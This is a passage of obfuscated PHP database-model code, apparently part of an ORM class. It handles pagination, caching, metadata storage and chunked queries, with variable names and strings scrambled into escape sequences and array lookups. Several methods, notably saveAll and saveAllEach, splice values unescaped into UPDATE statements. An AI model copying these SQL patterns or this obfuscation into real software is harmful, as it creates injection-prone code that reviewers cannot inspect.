$¹ˆğ¡³) { if (!is_array($ô¶¦¡ÔÛ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ê‘³Æ±][354])) { return; } foreach ($ô¶¦¡ÔÛ as &$Ñé˜†ã×) { $this->dataAfterFilter($Ñé˜†ã×); } unset($Ñé˜†ã×); } protected function _afterFind(&$ñß ó«ê, $ŠÉ¼œÄÂ) { if (!is_array($ñß ó«ê)) { return; } if (!$this->checkDataAutoHas($_SERVER[ê‘³Æ±][354])) { return; } $this->dataAfterFilter($ñß ó«ê); } public static function textEncode($©ñßÉÑ) { if (!$©ñßÉÑ) { return $©ñßÉÑ; } $•×‚Æ°Ï = json_encode($©ñßÉÑ); $•×‚Æ°Ï = preg_replace_callback($_SERVER[ê‘³Æ±][355], function ($¸¬°¶¡ª) { return addslashes($¸¬°¶¡ª[0]); }, $•×‚Æ°Ï); return json_decode($•×‚Æ°Ï); } public static function textDecode($ıô”½õà) { $º°÷çÕæ =& $_SERVER[ê‘³Æ±]; $ª™å§ü = json_encode($ıô”½õà); $ª™å§ü = preg_replace_callback($º°÷çÕæ[356], function ($ÂæÂÜıë) { return $_SERVER[ê‘³Æ±][98]; }, $ª™å§ü); return json_decode($ª™å§ü); } public function setAutoIncrement($ê¸Û„ÕŞ) { $Šğ®„à® = array($this->getPk() => $ê¸Û„ÕŞ); $õ¯êœ“ = $this->data($Šğ®„à®)->add(); if ($õ¯êœ“) { $this->delete($õ¯êœ“); } } public function getAutoIncrement() { $¯ÊÎÆ¥ó = $this->getTableName(); $äŸØ¡¾Ô = $this->max($this->getPk()); $«©íç¢ñ = $this->query("\163\x68\x6f\167\x20\164\x61\142\154\145\x20\163\164\141\x74\165\x73\40\167\150\145\x72\x65\40\116\141\155\x65\75\x27{$¯ÊÎÆ¥ó}\47"); $ İœ‹º‡ = $«©íç¢ñ[0][$_SERVER[ê‘³Æ±][357]]; $”¨½” = max($äŸØ¡¾Ô, $ İœ‹º‡); return $”¨½”; } protected function _callBefore($ºúÇ•’†, $¿ÊĞõ¥ö) { return $this->cacheCallCheck($ºúÇ•’†, $¿ÊĞõ¥ö, !1); } protected function _callAfter($æÀù•€Ò, $ËüÊ»ü‡) { return $this->cacheCallCheck($æÀù•€Ò, $ËüÊ»ü‡, !0); } protected function cacheFunctionAlias($îø’±èæ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($Ğ¾ÛªĞ­, $èÙËĞİù, $ñÄ ˆªø = false) { $¯©Å¡âö = $this->cacheFunctionAlias($èÙËĞİù); if (!$¯©Å¡âö) { return; } foreach ($¯©Å¡âö as $ô•¥ÇˆÅ => $ŸÍ±¸À) { $ú³òÀÜ¤ = $ŸÍ±¸À[0]; $¨¥àâ€ó = explode($_SERVER[ê‘³Æ±][50], $ŸÍ±¸À[1]); if ($Ğ¾ÛªĞ­ == $ô•¥ÇˆÅ) { return $this->cacheFunctionGet($ô•¥ÇˆÅ, $ú³òÀÜ¤); } if ($ñÄ ˆªø && in_array($Ğ¾ÛªĞ­, $¨¥àâ€ó)) { $this->cacheFunctionClear($ô•¥ÇˆÅ, $ú³òÀÜ¤); } } } public function cacheFunctionGet($ŒœşÁş, $›²–şÖ€) { $İô€Êı = $this->cacheKeyMake($ŒœşÁş, $›²–şÖ€); $ÛÅ†¨Ô = Cache::get($İô€Êı); if (!is_array($ÛÅ†¨Ô)) { $ÛÅ†¨Ô = call_user_func_array(array($this, $ŒœşÁş), array($›²–şÖ€, !0)); Cache::set($İô€Êı, $ÛÅ†¨Ô); } return $ÛÅ†¨Ô; } public function cacheFunctionClear($»¦ÅŞ™ä, $‡ğ¬êŠ) { $ §¼Üæİ = $‡ğ¬êŠ; if (!is_array($‡ğ¬êŠ)) { $ §¼Üæİ = array($‡ğ¬êŠ); } foreach ($ §¼Üæİ as $ªÕòê‰Ğ) { $óÂÇíÔó = $this->cacheKeyMake($»¦ÅŞ™ä, $ªÕòê‰Ğ); Cache::remove($óÂÇíÔó); } } private function cacheKeyMake($ŠÃæ÷ë, $ÂİÚ¬¨¶) { $Ö®ŞÛèî =& $_SERVER[ê‘³Æ±]; return get_class($this) . $Ö®ŞÛèî[11] . $ŠÃæ÷ë . $Ö®ŞÛèî[358] . $ÂİÚ¬¨¶; } protected function selectPageReset() { $ÑË’‹ªÆ =& $_SERVER[ê‘³Æ±]; if (isset($GLOBALS[$ÑË’‹ªÆ[359]])) { return; } $GLOBALS[$ÑË’‹ªÆ[359]] = isset($GLOBALS[$ÑË’‹ªÆ[7]][$ÑË’‹ªÆ[360]]) ? $GLOBALS[$ÑË’‹ªÆ[7]][$ÑË’‹ªÆ[360]] : !1; $GLOBALS[$ÑË’‹ªÆ[361]] = isset($GLOBALS[$ÑË’‹ªÆ[7]][$ÑË’‹ªÆ[350]]) ? $GLOBALS[$ÑË’‹ªÆ[7]][$ÑË’‹ªÆ[350]] : !1; $GLOBALS[$ÑË’‹ªÆ[7]][$ÑË’‹ªÆ[360]] = !1; $GLOBALS[$ÑË’‹ªÆ[7]][$ÑË’‹ªÆ[350]] = !1; } protected function selectPageRestore() { $Ï¶ˆ¼Æå =& $_SERVER[ê‘³Æ±]; if (!isset($GLOBALS[$Ï¶ˆ¼Æå[359]])) { return; } $GLOBALS[$Ï¶ˆ¼Æå[7]][$Ï¶ˆ¼Æå[360]] = $GLOBALS[$Ï¶ˆ¼Æå[359]]; $GLOBALS[$Ï¶ˆ¼Æå[7]][$Ï¶ˆ¼Æå[350]] = $GLOBALS[$Ï¶ˆ¼Æå[361]]; if ($GLOBALS[$Ï¶ˆ¼Æå[7]][$Ï¶ˆ¼Æå[360]] === !1) { unset($GLOBALS[$Ï¶ˆ¼Æå[7]][$Ï¶ˆ¼Æå[360]]); } if ($GLOBALS[$Ï¶ˆ¼Æå[7]][$Ï¶ˆ¼Æå[350]] === !1) { unset($GLOBALS[$Ï¶ˆ¼Æå[7]][$Ï¶ˆ¼Æå[350]]); } unset($GLOBALS[$Ï¶ˆ¼Æå[359]]); unset($GLOBALS[$Ï¶ˆ¼Æå[361]]); } protected function selectPage($Ø¥ĞÑ—¡ = 200, $ì†Åà’¶ = 1) { $™À‹İï¸ =& $_SERVER[ê‘³Æ±]; global $in; $ºòĞåã = $this->optionsValue(); $óëõ‹ß = 50000; $Ø¥ĞÑ—¡ = isset($in[$™À‹İï¸[360]]) && $in[$™À‹İï¸[360]] ? $in[$™À‹İï¸[360]] : $Ø¥ĞÑ—¡; if ($Ø¥ĞÑ—¡ === -1) { $in[$™À‹İï¸[360]] = !1; $óëõ‹ß = 100000000; $Ø¥ĞÑ—¡ = $óëõ‹ß; } $òŸüÓÙÍ = $ºòĞåã; $òŸüÓÙÍ[$™À‹İï¸[362]] = array(); $Ø¥ĞÑ—¡ = intval($Ø¥ĞÑ—¡); $Ø¥ĞÑ—¡ = $Ø¥ĞÑ—¡ <= 5 ? 5 : ($Ø¥ĞÑ—¡ >= $óëõ‹ß ? $óëõ‹ß : $Ø¥ĞÑ—¡); $ì†Åà’¶ = intval(isset($in[$™À‹İï¸[350]]) && $in[$™À‹İï¸[350]] ? $in[$™À‹İï¸[350]] : $ì†Åà’¶); $ì†Åà’¶ = $ì†Åà’¶ <= 1 ? 1 : $ì†Åà’¶; $ Á²ıš¨ = array(); $¹ˆŒ¼» = 1; if ($ì†Åà’¶ == 1 && $¹ˆŒ¼») { $this->optionsValue($ºòĞåã); $ Á²ıš¨ = $this->page($ì†Åà’¶, $Ø¥ĞÑ—¡)->select(); $È‚ú¼ª = is_array($ Á²ıš¨) ? count($ Á²ıš¨) : 0; if ($È‚ú¼ª < $Ø¥ĞÑ—¡) { $à¹ª›Š· = 1; } else { $this->optionsValue($òŸüÓÙÍ); $È‚ú¼ª = intval($this->count()); $à¹ª›Š· = ceil($È‚ú¼ª / $Ø¥ĞÑ—¡); } } else { $this->optionsValue($òŸüÓÙÍ); $È‚ú¼ª = intval($this->count()); $à¹ª›Š· = ceil($È‚ú¼ª / $Ø¥ĞÑ—¡); $ì†Åà’¶ = $ì†Åà’¶ >= $à¹ª›Š· ? $à¹ª›Š· : $ì†Åà’¶; $this->optionsValue($ºòĞåã); $ Á²ıš¨ = $this->page($ì†Åà’¶, $Ø¥ĞÑ—¡)->select(); } if (!is_array($ Á²ıš¨)) { $ Á²ıš¨ = array(); } if ($à¹ª›Š· == 1) { $È‚ú¼ª = count($ Á²ıš¨); } $şßÀ“Õö = array($™À‹İï¸[363] => array($™À‹İï¸[364] => $È‚ú¼ª, $™À‹İï¸[360] => $Ø¥ĞÑ—¡, $™À‹İï¸[350] => $ì†Åà’¶, $™À‹İï¸[365] => $à¹ª›Š·), $™À‹İï¸[366] => $ Á²ıš¨); return $şßÀ“Õö; } protected function checkLength($î›Ÿ¸Ô…, $ªä‹½¢„ = 0, $¯Ø­Ş‘œ = '') { $œ‘õ£½‰ =& $_SERVER[ê‘³Æ±]; $ªä‹½¢„ = $ªä‹½¢„ ? $ªä‹½¢„ : 65536; if (!$î›Ÿ¸Ô… || strlen($î›Ÿ¸Ô…) < $ªä‹½¢„) { return; } $¯Ø­Ş‘œ = $¯Ø­Ş‘œ ? $¯Ø­Ş‘œ . $œ‘õ£½‰[71] : $œ‘õ£½‰[12]; show_json($¯Ø­Ş‘œ . LNG($œ‘õ£½‰[367]) . "\x28{$ªä‹½¢„}\51", !1); } protected function metaSet($‹’ª÷›œ, $İ»ä›ü = null, $Ú»ÓûÆ = null) { $ì­ğÁÅ³ =& $_SERVER[ê‘³Æ±]; if (!$this->tableMeta || !$‹’ª÷›œ) { return !1; } $ÑèÃí˜à = $this->tableMeta[$ì­ğÁÅ³[368]]; $¹“óé¼ã = $this->tableMeta[$ì­ğÁÅ³[369]]; $ıæœÔÁ = Model($¹“óé¼ã); $Ÿ®îöå = array($ÑèÃí˜à => $‹’ª÷›œ, $ì­ğÁÅ³[370] => $İ»ä›ü); if (is_null($İ»ä›ü)) { return $ıæœÔÁ->where(array($ÑèÃí˜à => $‹’ª÷›œ))->delete(); } if (is_null($Ú»ÓûÆ) && is_string($İ»ä›ü)) { return $ıæœÔÁ->where($Ÿ®îöå)->delete(); } $¬ğââ¢Ú = is_array($İ»ä›ü) ? $İ»ä›ü : array(); if (is_string($İ»ä›ü)) { $¬ğââ¢Ú[$İ»ä›ü] = $Ú»ÓûÆ; } $š·‡¦· = array(); foreach ($¬ğââ¢Ú as $ğÁ—ä => $¢ı«ƒ¿‘) { if (is_null($¢ı«ƒ¿‘) && is_string($ğÁ—ä)) { $ıæœÔÁ->where(array($ÑèÃí˜à => $‹’ª÷›œ, $ì­ğÁÅ³[370] => $ğÁ—ä))->delete(); continue; } $this->checkLength($¢ı«ƒ¿‘, !1, $¹“óé¼ã . $ì­ğÁÅ³[4] . $ğÁ—ä); $š·‡¦·[] = array($ÑèÃí˜à => $‹’ª÷›œ, $ì­ğÁÅ³[95] => $ğÁ—ä, $ì­ğÁÅ³[371] => $¢ı«ƒ¿‘); } $È×ç‚ë = $ì­ğÁÅ³[372] . $¹“óé¼ã; CacheLock::lock($È×ç‚ë); $ıæœÔÁ->where(array($ÑèÃí˜à => $‹’ª÷›œ))->addAll($š·‡¦·, array(), !0); CacheLock::unlock($È×ç‚ë); return !0; } public function metaGet($İĞ”»Ó, $õËêÃˆì = false) { $ïà¶š¥Ù =& $_SERVER[ê‘³Æ±]; if (!$this->tableMeta) { return array(); } $¨“¦ßšè = $this->tableMeta[$ïà¶š¥Ù[368]]; $­ØÁ–»° = Model($this->tableMeta[$ïà¶š¥Ù[369]]); if ($õËêÃˆì) { $— €İİ¼ = array($¨“¦ßšè => $İĞ”»Ó, $ïà¶š¥Ù[95] => $õËêÃˆì); return $­ØÁ–»°->where($— €İİ¼)->getField($ïà¶š¥Ù[371]); } $— €İİ¼ = array($¨“¦ßšè => $İĞ”»Ó); $ÃŸã­™ = $­ØÁ–»°->field($ïà¶š¥Ù[373])->where($— €İİ¼)->select(); $ÃŸã­™ = array_to_keyvalue($ÃŸã­™, $ïà¶š¥Ù[95], $ïà¶š¥Ù[371]); return $ÃŸã­™; } private function checkDataAutoHas($ğ¾˜ûÏº) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ÄİùØÆ°) { if (in_array($ğ¾˜ûÏº, explode($_SERVER[ê‘³Æ±][50], $ÄİùØÆ°[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$˜Î·şÌà, $ºò¬¢Æ) { $Ã˜‚Ğš =& $_SERVER[ê‘³Æ±]; if (!is_array($˜Î·şÌà)) { return; } foreach ($this->dataAuto as $Àğ±¤Üü) { $úö’‚ ª = $Àğ±¤Üü[0]; if (!in_array($ºò¬¢Æ, explode($Ã˜‚Ğš[50], $Àğ±¤Üü[2]))) { continue; } switch (trim($Àğ±¤Üü[3])) { case $Ã˜‚Ğš[318]: case $Ã˜‚Ğš[319]: $ùí¥Ê³’ = $Àğ±¤Üü[1]; $À’ŠÒÄ = isset($Àğ±¤Üü[4]) ? (array) $Àğ±¤Üü[4] : array(); if ($ùí¥Ê³’ == $Ã˜‚Ğš[198] && array_key_exists($úö’‚ ª, $˜Î·şÌà)) { if (!$˜Î·şÌà[$úö’‚ ª]) { unset($˜Î·şÌà[$úö’‚ ª]); } break; } if (isset($˜Î·şÌà[$úö’‚ ª])) { array_unshift($À’ŠÒÄ, $˜Î·şÌà[$úö’‚ ª]); } if ($Ã˜‚Ğš[318] == $Àğ±¤Üü[3]) { $˜Î·şÌà[$úö’‚ ª] = call_user_func_array($ùí¥Ê³’, $À’ŠÒÄ); } else { $˜Î·şÌà[$úö’‚ ª] = call_user_func_array(array(&$this, $ùí¥Ê³’), $À’ŠÒÄ); } break; case $Ã˜‚Ğš[267]: if (isset($˜Î·şÌà[$úö’‚ ª]) && $˜Î·şÌà[$úö’‚ ª]) { $˜Î·şÌà[$úö’‚ ª] = call_user_func_array(array(&$this, $Àğ±¤Üü[1]), array($˜Î·şÌà[$úö’‚ ª])); } break; case $Ã˜‚Ğš[270]: $˜Î·şÌà[$úö’‚ ª] = $˜Î·şÌà[$Àğ±¤Üü[1]]; break; case $Ã˜‚Ğš[291]: if (isset($˜Î·şÌà[$úö’‚ ª]) && !is_string($˜Î·şÌà[$úö’‚ ª])) { $˜Î·şÌà[$úö’‚ ª] = json_encode_force($˜Î·şÌà[$úö’‚ ª]); } break; case $Ã˜‚Ğš[320]: if ($˜Î·şÌà[$úö’‚ ª] === $Ã˜‚Ğš[12]) { unset($˜Î·şÌà[$úö’‚ ª]); } break; case $Ã˜‚Ğš[321]: $˜Î·şÌà[$úö’‚ ª] = $Àğ±¤Üü[1]; default: break; } } if ($ºò¬¢Æ == $Ã˜‚Ğš[352]) { $Ó¶ÛÒ½÷ = strtolower($this->db->getDbType()); if (strpos($Ó¶ÛÒ½÷, $Ã˜‚Ğš[13]) !== 0) { return; } $è¡¨Œ‹² = $this->field(!0)->fields; $ˆÁŒĞ²³ = $è¡¨Œ‹²[$Ã˜‚Ğš[249]]; if (isset($è¡¨Œ‹²[$Ã˜‚Ğš[248]])) { unset($ˆÁŒĞ²³[$è¡¨Œ‹²[$Ã˜‚Ğš[248]]]); } foreach ($ˆÁŒĞ²³ as $«´¦¼âú => $ºò¬¢Æ) { if (!isset($˜Î·şÌà[$«´¦¼âú])) { $˜Î·şÌà[$«´¦¼âú] = $Ã˜‚Ğš[12]; } } } } private function dataAfterFilter(&$Ìîª˜™î) { $İéÔƒ× =& $_SERVER[ê‘³Æ±]; foreach ($this->dataAuto as $–ş¸–û) { $‰µÄ€Äô = $–ş¸–û[0]; if (!isset($Ìîª˜™î[$‰µÄ€Äô])) { continue; } if (!in_array($İéÔƒ×[354], explode($İéÔƒ×[50], $–ş¸–û[2]))) { continue; } switch (trim($–ş¸–û[3])) { case $İéÔƒ×[318]: case $İéÔƒ×[319]: $°ç©ËòÛ = isset($–ş¸–û[4]) ? (array) $–ş¸–û[4] : array(); array_unshift($°ç©ËòÛ, $Ìîª˜™î[$‰µÄ€Äô]); if (isset($–ş¸–û[4]) && $–ş¸–û[4] == $İéÔƒ×[374]) { $°ç©ËòÛ = array($Ìîª˜™î[$‰µÄ€Äô]); } if ($İéÔƒ×[318] == $–ş¸–û[3]) { $Ìîª˜™î[$‰µÄ€Äô] = call_user_func_array($–ş¸–û[1], $°ç©ËòÛ); } else { $Ìîª˜™î[$‰µÄ€Äô] = call_user_func_array(array(&$this, $–ş¸–û[1]), $°ç©ËòÛ); } break; case $İéÔƒ×[267]: if (isset($Ìîª˜™î[$‰µÄ€Äô]) && $Ìîª˜™î[$‰µÄ€Äô]) { $Ìîª˜™î[$‰µÄ€Äô] = call_user_func_array(array(&$this, $–ş¸–û[1]), array($Ìîª˜™î[$‰µÄ€Äô])); } break; case $İéÔƒ×[270]: $Ìîª˜™î[$‰µÄ€Äô] = $Ìîª˜™î[$–ş¸–û[1]]; break; case $İéÔƒ×[291]: $‡ûíÏ±Ç = $Ìîª˜™î[$‰µÄ€Äô]; $Ìîª˜™î[$‰µÄ€Äô] = json_decode($‡ûíÏ±Ç, !0); if (is_null($Ìîª˜™î[$‰µÄ€Äô])) { $Ìîª˜™î[$‰µÄ€Äô] = $‡ûíÏ±Ç; } break; case $İéÔƒ×[320]: if ($Ìîª˜™î[$‰µÄ€Äô] === $İéÔƒ×[12]) { unset($Ìîª˜™î[$‰µÄ€Äô]); } break; case $İéÔƒ×[321]: $Ìîª˜™î[$‰µÄ€Äô] = $–ş¸–û[1]; break; default: break; } } } public function saveAll($ü×îşØš) { $Şµù‹¦Â =& $_SERVER[ê‘³Æ±]; $¶ÏÍšŠ = $this->tablePrefix . $this->tableName; $”êŞø = self::SQL_WHERE_IN_CHUNK; $ü×îşØš = is_array($ü×îşØš) ? $ü×îşØš : array(); $Û„¯×ÈÊ = $Şµù‹¦Â[375]; $€Ûœ…ö = 0; $ÈˆôàÒú = array(); $‰•©àŞ = count($ü×îşØš); for ($ö‡¸Í¼† = 0; $ö‡¸Í¼† < $‰•©àŞ; $ö‡¸Í¼†++) { $ˆ“¥ĞŠ = $ü×îşØš[$ö‡¸Í¼†]; if (!is_array($ˆ“¥ĞŠ) || count($ˆ“¥ĞŠ) != 4) { continue; } $©ËíĞä = "\125\x50\x44\x41\x54\x45\40\x60{$¶ÏÍšŠ}\140\x20\123\x45\x54\x20{$ˆ“¥ĞŠ[2]}\40\75\40\103\101\123\105\40{$ˆ“¥ĞŠ[0]}\40\12"; if ($€Ûœ…ö == 0) { $Û„¯×ÈÊ = $©ËíĞä; } $ÈˆôàÒú[] = $Şµù‹¦Â[119] . $ˆ“¥ĞŠ[1] . $Şµù‹¦Â[119]; $€Ûœ…ö++; $Û„¯×ÈÊ .= "\40\x57\110\105\116\x20\x27{$ˆ“¥ĞŠ[1]}\47\40\124\110\x45\x4e\40\x27{$ˆ“¥ĞŠ[3]}\47\40\12"; if ($€Ûœ…ö == $”êŞø || $ö‡¸Í¼† == $‰•©àŞ - 1) { $¾ÆĞ²Ä = implode($Şµù‹¦Â[50], $ÈˆôàÒú); $Û„¯×ÈÊ .= "\x20\105\116\104\40\40\x57\110\105\x52\105\40{$ˆ“¥ĞŠ[0]}\x20\111\116\x20\x28{$¾ÆĞ²Ä}\51\40"; $this->execute($Û„¯×ÈÊ); $€Ûœ…ö = 0; $Û„¯×ÈÊ = $©ËíĞä; $this->chunkEventCheck(count($ÈˆôàÒú)); $ÈˆôàÒú = array(); } } $this->chunkEventSet(); } public function saveAllEach($”¥éàØó) { $ƒôÔÃÜ =& $_SERVER[ê‘³Æ±]; $® ™ä¸ = $this->tablePrefix . $this->tableName; foreach ($”¥éàØó as $š‘µÕĞ) { if (!is_array($š‘µÕĞ) || count($š‘µÕĞ) != 4) { continue; } $æ¤ˆÓÈ¸ = $š‘µÕĞ[0] . $ƒôÔÃÜ[376] . $š‘µÕĞ[1] . $ƒôÔÃÜ[119]; $‰äê†ê™ = $š‘µÕĞ[2] . $ƒôÔÃÜ[376] . $š‘µÕĞ[3] . $ƒôÔÃÜ[119]; $¦ÒŞÉ° = "\x75\160\x64\141\x74\x65\x20{$® ™ä¸}\40\163\x65\164\40{$‰äê†ê™}\40\167\150\x65\x72\145\x20{$æ¤ˆÓÈ¸}\x3b"; $this->execute($¦ÒŞÉ°); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ÜËëõªÊ = false, $éÓ¿Ó…Ç = false) { $this->_chunkEvent = $ÜËëõªÊ; $this->_chunkEventParam = $éÓ¿Ó…Ç; } private function chunkEventCheck($ªşåêÅ) { if (!$this->_chunkEvent) { return; } $¢ùëï’ş = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $¢ùëï’ş[$_SERVER[ê‘³Æ±][377]] = $ªşåêÅ; Hook::trigger($this->_chunkEvent, $¢ùëï’ş); } public function addAll($î†ÀæÔı, $‡·ºˆ = array(), $Åš”Áş® = false) { $ì—ãá  =& $_SERVER[ê‘³Æ±]; ignore_timeout(); $“ø–É  = self::SQL_WHERE_IN_CHUNK; if (empty($î†ÀæÔı)) { $this->error = think_lang($ì—ãá [268]); return !1; } $‡·ºˆ = $this->_parseOptions($‡·ºˆ); foreach ($î†ÀæÔı as $½ß±Å÷Î => $®•Ìº—Ü) { $î†ÀæÔı[$½ß±Å÷Î] = $this->_facade($®•Ìº—Ü); $this->_beforeInsert($î†ÀæÔı[$½ß±Å÷Î], $‡·ºˆ); } if (method_exists($this->db, $ì—ãá [269])) { for ($Ç”Õı¿Å = 0; $Ç”Õı¿Å < count($î†ÀæÔı); $Ç”Õı¿Å += $“ø–É ) { $î»šÁÙŠ = array_slice($î†ÀæÔı, $Ç”Õı¿Å, $“ø–É ); if (!is_array($î»šÁÙŠ) || count($î»šÁÙŠ) == 0) { break; } $­¼²·ññ = $this->db->insertAll($î»šÁÙŠ, $‡·ºˆ, $Åš”Áş®); $this->chunkEventCheck(count($î»šÁÙŠ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($î†ÀæÔı as $½ß±Å÷Î => $®•Ìº—Ü) { $­¼²·ññ = $this->db->insert($®•Ìº—Ü, $‡·ºˆ, $Åš”Áş®); } $this->commit(); } if (!1 !== $­¼²·ññ) { $«Ïê”˜ = $this->getLastInsID(); if ($«Ïê”˜) { return $«Ïê”˜; } } return $­¼²·ññ; } public function save($“ƒíÑü = '', $ËŞÁÎ×æ = array()) { $’×ŸÁÇÄ =& $_SERVER[ê‘³Æ±]; $ù¬Ï–ÆÉ = self::SQL_WHERE_IN_CHUNK; $„Ì•«á = $this->optionsValue(); $æá”±ôğ = $this->findWhereField($„Ì•«á); if (!$æá”±ôğ) { return parent::save($“ƒíÑü, $ËŞÁÎ×æ); } $ó›­ÑîÛ = 0; $»ªÍË¦ù = $„Ì•«á[$’×ŸÁÇÄ[272]][$æá”±ôğ][1]; $»ªÍË¦ù = is_array($»ªÍË¦ù) ? $»ªÍË¦ù : array(); $‚Ïå¨ğ÷ = count($»ªÍË¦ù); for ($×úÊñÄİ = 0; $×úÊñÄİ < $‚Ïå¨ğ÷; $×úÊñÄİ += $ù¬Ï–ÆÉ) { $Àëœ˜ê = array_slice($»ªÍË¦ù, $×úÊñÄİ, $ù¬Ï–ÆÉ); if (!is_array($Àëœ˜ê) || count($Àëœ˜ê) == 0) { break; } $„Ì•«á[$’×ŸÁÇÄ[272]][$æá”±ôğ][1] = $Àëœ˜ê; $this->optionsValue($„Ì•«á); $ó›­ÑîÛ += parent::save($“ƒíÑü, $ËŞÁÎ×æ); $this->chunkEventCheck(count($Àëœ˜ê)); } $this->chunkEventSet(); return $ó›­ÑîÛ; } public function add($‰¥·¨¼» = '', $»ŞÚÉË = array(), $¾´‚İÍ = false) { if ($this->addTaskStatus && is_array($‰¥·¨¼»)) { $this->addTaskData[] = $‰¥·¨¼»; return; } return parent::add($‰¥·¨¼», $»ŞÚÉË, $¾´‚İÍ); } public function parseWhereLike($ä¬¤¤Ê½, $é›åŞõØ = '', $Á× ‹—ô = false, &$ñÈµÜ…â = false) { $Ê³Éà› =& $_SERVER[ê‘³Æ±]; $ùå©Ÿëå = $GLOBALS[$Ê³Éà›[6]][$Ê³Éà›[378]]; if (!$ùå©Ÿëå[$Ê³Éà›[379]]) { return $ä¬¤¤Ê½; } if (!is_array($ä¬¤¤Ê½)) { return $ä¬¤¤Ê½; } $¦æ¶«‘É = array(); $äşâàª„ = 0; foreach ($ä¬¤¤Ê½ as $ùÂ¢©˜‡ => $¨Š‹ºËˆ) { if (is_array($¨Š‹ºËˆ) && count($¨Š‹ºËˆ) == 2 && $¨Š‹ºËˆ[0] == $Ê³Éà›[380] && is_string($¨Š‹ºËˆ[1]) && substr($¨Š‹ºËˆ[1], 0, 1) == $Ê³Éà›[381] && substr($¨Š‹ºËˆ[1], strlen($¨Š‹ºËˆ[1]) - 1, 1) == $Ê³Éà›[381]) { $ñÈµÜ…â = !0; $Ñƒ‘œÑ• = is_string($ùÂ¢©˜‡) ? $ùÂ¢©˜‡ : $é›åŞõØ; $Û×õ½ñá = substr($¨Š‹ºËˆ[1], 1, strlen($¨Š‹ºËˆ[1]) - 2); $Û×õ½ñá = $this->db->escapeString($Û×õ½ñá); if (!strpos($Ñƒ‘œÑ•, $Ê³Éà›[10])) { $Ñƒ‘œÑ• = $Ê³Éà›[382] . $Ñƒ‘œÑ• . $Ê³Éà›[382]; } $™ƒ†êç = $Ê³Éà›[183] . $Û×õ½ñá . $Ê³Éà›[183]; if ($ùå©Ÿëå[$Ê³Éà›[383]]) { $™ƒ†êç = $Ê³Éà›[384] . $Û×õ½ñá . $Ê³Éà›[385]; if ($ùå©Ÿëå[$Ê³Éà›[386]]) { $™ƒ†êç = $Ê³Éà›[385] . $Û×õ½ñá . $Ê³Éà›[384]; } } $¦æ¶«‘É[$äşâàª„] = $Ê³Éà›[387] . $Ñƒ‘œÑ• . $Ê³Éà›[388] . $™ƒ†êç . $Ê³Éà›[389]; $äşâàª„++; continue; } if (is_array($¨Š‹ºËˆ)) { $é›åŞõØ = is_string($ùÂ¢©˜‡) ? $ùÂ¢©˜‡ : $é›åŞõØ; $¨Š‹ºËˆ = $this->parseWhereLike($¨Š‹ºËˆ, $é›åŞõØ, !0, $ñÈµÜ…â); } if (is_numeric($ùÂ¢©˜‡)) { $¦æ¶«‘É[$äşâàª„] = $¨Š‹ºËˆ; $äşâàª„++; } else { $¦æ¶«‘É[$ùÂ¢©˜‡] = $¨Š‹ºËˆ; } } if ($ñÈµÜ…â && !$Á× ‹—ô) { } return $¦æ¶«‘É; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($İÚËÉ³ = array()) { $ì€øãğ“ =& $_SERVER[ê‘³Æ±]; $¸²ˆâÑ• = self::SQL_WHERE_IN_CHUNK; $øêÃ« = $this->optionsValue(); $âŒ¸Àçç = $this->findWhereField($øêÃ«); if (!$âŒ¸Àçç || isset($øêÃ«[$ì€øãğ“[289]]) || isset($øêÃ«[$ì€øãğ“[350]])) { return parent::select($İÚËÉ³); } $œ©ŸŸóô = $øêÃ«[$ì€øãğ“[272]][$âŒ¸Àçç][1]; $œ©ŸŸóô = is_array($œ©ŸŸóô) ? $œ©ŸŸóô : array(); $ØÎ¬Ôë = null; for ($Á¸Å¡¿š = 0; $Á¸Å¡¿š < count($œ©ŸŸóô); $Á¸Å¡¿š += $¸²ˆâÑ•) { $‰¸¼ÇÈ‚ = array_slice($œ©ŸŸóô, $Á¸Å¡¿š, $¸²ˆâÑ•); if (!is_array($‰¸¼ÇÈ‚) || count($‰¸¼ÇÈ‚) == 0) { break; } $øêÃ«[$ì€øãğ“[272]][$âŒ¸Àçç][1] = $‰¸¼ÇÈ‚; $this->optionsValue($øêÃ«); $¶¥©üôâ = parent::select($İÚËÉ³); if (!$¶¥©üôâ) { continue; } $ØÎ¬Ôë = is_array($ØÎ¬Ôë) ? $ØÎ¬Ôë : array(); $ØÎ¬Ôë = array_merge($ØÎ¬Ôë, $¶¥©üôâ); } return $ØÎ¬Ôë; } public function delete($ŸŸ²’‘µ = array()) { $¼¡¼ıòã =& $_SERVER[ê‘³Æ±]; $ûûÆúÑß = self::SQL_WHERE_IN_CHUNK; $ô†Èò£– = $this->optionsValue(); $Æ°‚ı±” = $this->findWhereField($ô†Èò£–); if (!$Æ°‚ı±”) { return parent::delete($ŸŸ²’‘µ); } $Öä˜Ú£† = 0; $ø¹æûĞ´ = $ô†Èò£–[$¼¡¼ıòã[272]][$Æ°‚ı±”][1]; $ø¹æûĞ´ = is_array($ø¹æûĞ´) ? $ø¹æûĞ´ : array(); for ($¢°Ì·€ = 0; $¢°Ì·€ < count($ø¹æûĞ´); $¢°Ì·€ += $ûûÆúÑß) { $¢ğ¾à±‘ = array_slice($ø¹æûĞ´, $¢°Ì·€, $ûûÆúÑß); if (!is_array($¢ğ¾à±‘) || count($¢ğ¾à±‘) == 0) { break; } $ô†Èò£–[$¼¡¼ıòã[272]][$Æ°‚ı±”][1] = $¢ğ¾à±‘; $this->optionsValue($ô†Èò£–); $Öä˜Ú£† += parent::delete($ŸŸ²’‘µ); } return $Öä˜Ú£†; } private function findWhereField($ÏãÒä–Ğ) { $ú‘ı°ñ· =& $_SERVER[ê‘³Æ±]; $Œäëô§® = self::SQL_WHERE_IN_CHUNK; if (!is_array($ÏãÒä–Ğ) || !is_array($ÏãÒä–Ğ[$ú‘ı°ñ·[272]])) { return !1; } foreach ($ÏãÒä–Ğ[$ú‘ı°ñ·[272]] as 